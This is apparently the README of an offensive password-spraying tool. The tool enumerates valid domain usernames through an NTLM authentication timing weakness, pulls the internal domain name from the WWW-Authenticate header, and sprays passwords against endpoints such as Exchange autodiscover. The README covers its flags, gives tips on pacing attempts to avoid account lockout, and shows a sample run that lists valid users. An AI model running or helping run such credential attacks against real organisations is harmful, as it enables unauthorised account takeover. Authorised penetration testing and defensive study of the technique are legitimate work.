# 401_spray
password spraying tool that will check for username validation using the Microsoft CAS timing vulnerability found on endpoints using NTLM authentication. Original code can be found here: https://github.com/fang0654/401_spraying. 
Simply added the following abilities to the original code:
1) to check your username list for valid entries.
2) Obtain the internal domain name tied to the NTLM Authentication using the WWW-Authenticate Header (Only tried this with one target, your milage may vary).
3) Runs the password spraying attack using usernames identified as valid.
4) Seperates the password spraying attack and username validation using the -v and -c flags. 
5) Added some additional flag options so the user isn't forced to use --threads for example (-t can be used).


```python
usage: 401_spray.py [-h] -u USERNAMES -p PASSWORDS [-d DOMAIN] -U URL [-a ATTEMPTS] [-i INTERVAL] [--authtype {ntlm,basic}] [--proxy PROXY] [-t THREADS] [-o OUTPUT] [--add_response] [-v] [-c]

optional arguments:
  -h, --help            show this help message and exit
  -u USERNAMES, --usernames USERNAMES
                        List of usernames to attack
  -p PASSWORDS, --passwords PASSWORDS
                        List of passwords to try
  -d DOMAIN, --domain DOMAIN
                        Domain name to append. If not included, then domains will be assumed to be in username list.
  -U URL, --url URL     URL to authenticate against
  -a ATTEMPTS, --attempts ATTEMPTS
                        Number of attempts to try before sleeping. If your lockout policy is 5 attempts per 10 minutes, then set this to like 3
  -i INTERVAL, --interval INTERVAL
                        Number of minutes to sleep between attacks. If your lockout policy is per 10 minutes, set this to like 11
  --authtype {ntlm,basic}
                        Authentication type - basic or ntlm. Note: You can't use a proxy with NTLM
  --proxy PROXY         Proxy server to route traffic through
  -t THREADS, --threads THREADS
                        Number of threads
  -o OUTPUT, --output OUTPUT
                        File to write successful pairs to
  --add_response        Add response times to output
  -v, --validate_users  Validates the list of usernames. By default will also run password spraying attack.
  -c, --check_creds     Runs the password spraying attack
```

Example output:
```Python
./401_spray.py -v -U https://autodiscover.<target>/autodiscover/autodiscover.xml -p /users/bortiz/Documents/Projects/passwords.txt -u /users/bortiz/Documents/Projects/user_names.txt -t 50 -o /users/bortiz/Documents/Projects/valid_creds.txt -i 60 

New password spraying run
Spraying 1 passwords, then sleeping for 60.
URL: https://autodiscover.<target>/autodiscover/autodiscover.xml
[*] Performing incorrect Domain Test
[+] auth creds: random\aaaaaaz, time elapsed: 0:00:00.384964
[+] auth creds: anything1\bbbbbbz, time elapsed: 0:00:00.372382
[+] auth creds: bread_man\ccccccz, time elapsed: 0:00:04.997914
[*] Performing correct Username & Domain Test
[+] auth creds: domain\Guest, time elapsed: 0:00:00.373984
[+] auth creds: domain\Administrator, time elapsed: 0:00:00.374277
[+] auth creds: domain\krbtgt, time elapsed: 0:00:00.371279
[*] Performing incorrect Username Test
[+] auth creds: domain\aaaaaaz, time elapsed: 0:00:15.357264
[+] auth creds: domain\bbbbbbz, time elapsed: 0:00:10.670948
[+] auth creds: domain\ccccccz, time elapsed: 0:00:15.460272
[+] Avg time: 0:00:13.829495
[*] Threshold: 0:00:08.297697
[+] VALID USER FOUND: domain\user1, time elapsed: 0:00:00.522217
[+] VALID USER FOUND: domain\user2, time elapsed: 0:00:00.404065
[+] VALID USER FOUND: domain\user3, time elapsed: 0:00:00.430944
[+] VALID USER FOUND: domain\user4, time elapsed: 0:00:00.422542
[+] VALID USER FOUND: domain\user5, time elapsed: 0:00:00.411033
[+] VALID USER FOUND: domain\user6, time elapsed: 0:00:00.642477
```
